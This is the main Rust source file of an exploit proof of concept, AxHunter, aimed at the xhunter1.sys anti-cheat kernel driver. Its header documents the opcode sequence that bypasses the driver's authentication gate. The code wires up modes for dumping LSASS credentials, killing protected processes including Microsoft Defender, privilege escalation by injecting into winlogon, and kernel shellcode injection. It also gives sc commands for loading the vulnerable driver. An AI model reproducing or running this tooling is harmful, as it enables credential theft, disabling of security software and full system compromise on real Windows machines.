//! AxHunter — exploit PoC for `xhunter1.sys` v2023.12.7.78 (Wellbia XIGNCODE3).
//!
//! Targets the current production driver build. Bypasses the per-PID auth gate
//! added in v2023.09.19.078 by writing the magic flag combo (`0x80000008`) into
//! the caller's allowlist entry via two unauthenticated opcodes — cmd 777
//! (sets bit 31) and cmd 775 (sets bit 3) — then issues cmd 785 to obtain a
//! kernel-minted `PROCESS_ALL_ACCESS` handle on any PID, including PPL.
//!
//! Four modes plus `all`:
//!
//!   * `dump`   — credential extraction from `lsass.exe`.
//!   * `kill`   — handle-stomp PPL kill via cmd 800.
//!   * `lpe`    — VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into
//!                winlogon.exe on the cmd 785 PROCESS_ALL_ACCESS handle.
//!   * `inject` — kernel-mode code injection via cmd 820 (RWX alloc +
//!                RtlCreateUserThread, all kernel-side).
//!
//! Build:  cargo build --release
//! Run:    .\target\release\AxHunter_v1.exe -m dump -d <service-name>
//!         .\target\release\AxHunter_v1.exe -m kill -t <pid|name> -d <service-name>
//!         .\target\release\AxHunter_v1.exe -m lpe -d <service-name>
//!         .\target\release\AxHunter_v1.exe -m inject -t winlogon.exe -d <service-name>
//!         .\target\release\AxHunter_v1.exe -m all -d <service-name>

#![allow(clippy::upper_case_acronyms)]

mod driver;
mod dump;
mod inject;
mod kill;
mod lpe;
mod proc;

use std::process::ExitCode;

use clap::{Parser, ValueEnum};

use driver::Xhunter;

#[derive(Parser, Debug)]
#[command(
    name = "AxHunter_v1",
    version,
    about = "xhunter1.sys v2023.12.7.78 (Wellbia XIGNCODE3) — auth-gate-bypass PoC",
    long_about = None,
)]
struct Cli {
    /// Mode to run.
    #[arg(short = 'm', long = "mode", value_enum)]
    mode: Mode,

    /// Target PID (e.g. 1234) or image name (e.g. msmpeng.exe).
    /// Required for `-m kill` and `-m inject`.
    #[arg(short = 't', long = "target", required_if_eq_any([("mode", "kill"), ("mode", "inject")]))]
    target: Option<String>,

    /// Driver device path. Accepts a bare service name ("xhunter1_latest")
    /// or a full path ("\\.\xhunter").
    #[arg(short = 'd', long = "device", default_value = driver::DEFAULT_DEVICE)]
    device: String,

    /// Raw shellcode `.bin` file for `-m inject`. If omitted, uses the
    /// built-in WinExec("cmd.exe") shellcode.
    #[arg(short = 'p', long = "payload")]
    payload: Option<String>,
}

#[derive(ValueEnum, Clone, Debug, PartialEq, Eq)]
#[clap(rename_all = "lowercase")]
enum Mode {
    Dump,
    Kill,
    Lpe,
    Inject,
    All,
}

fn banner() {
    println!();
    println!("  AxHunter — xhunter1.sys v2023.12.7.78 (Wellbia XIGNCODE3)");
    println!("  Auth-gate bypass: cmd 777 + cmd 775 → cmd 785 PPL handle");
    println!();
}

fn open_driver(device: &str) -> Result<Xhunter, String> {
    let driver = Xhunter::open_named(device).map_err(|e| {
        format!("{e}\n    Driver must be loaded. Try:\n    \
                 sc create <name> type=kernel binPath=C:\\path\\to\\xhunter.sys\n    \
                 sc start <name>")
    })?;
    println!("[+] Driver opened ......... {device}");

    match driver.unlock_self() {
        Ok(()) => println!("[+] Auth gate unlocked .... cmd 777 + cmd 775 (flags=0x80000008)"),
        Err(e) => eprintln!("[!] Auth-gate unlock failed (ok on old driver): {e}"),
    }

    Ok(driver)
}

fn normalise_device(name: &str) -> String {
    if name.starts_with("\\\\.\\") || name.starts_with("\\\\?\\") {
        name.to_string()
    } else {
        format!("\\\\.\\{name}")
    }
}

fn all(device: &str) -> Result<(), String> {
    println!("[*] ===== mode: dump =====");
    if let Err(e) = dump::run(device) {
        eprintln!("[-] dump failed: {e}");
    }

    println!("\n[*] ===== mode: kill MsMpEng.exe =====");
    if let Err(e) = kill::run("MsMpEng.exe", device) {
        eprintln!("[-] kill failed: {e}");
    }

    println!("\n[*] ===== mode: lpe =====");
    if let Err(e) = lpe::run(device) {
        eprintln!("[-] lpe failed: {e}");
    }

    Ok(())
}

fn run() -> Result<(), String> {
    banner();

    let cli = Cli::parse();
    let device = normalise_device(&cli.device);

    match cli.mode {
        Mode::Dump => dump::run(&device),
        Mode::Kill => {
            let target = cli.target.expect("clap guarantees target for kill");
            kill::run(&target, &device)
        }
        Mode::Lpe => lpe::run(&device),
        Mode::Inject => {
            let target = cli.target.expect("clap guarantees target for inject");
            inject::run(&target, &device, cli.payload.as_deref())
        }
        Mode::All => all(&device),
    }
}

fn main() -> ExitCode {
    match run() {
        Ok(()) => ExitCode::SUCCESS,
        Err(e) => {
            eprintln!("[-] {e}");
            ExitCode::FAILURE
        }
    }
}
